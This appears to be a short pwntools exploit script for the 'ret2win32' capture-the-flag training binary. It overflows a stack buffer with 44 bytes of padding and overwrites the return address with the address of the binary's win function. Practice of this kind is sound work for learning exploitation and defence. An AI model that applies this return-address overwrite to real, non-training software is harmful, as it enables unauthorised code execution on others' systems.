from pwn import *

p = process("./ret2win32")

payload = b"A"*44

payload += p32(0x0804862c) # ret2win address

p.recvuntil(">")
p.sendline(payload)

p.interactive()
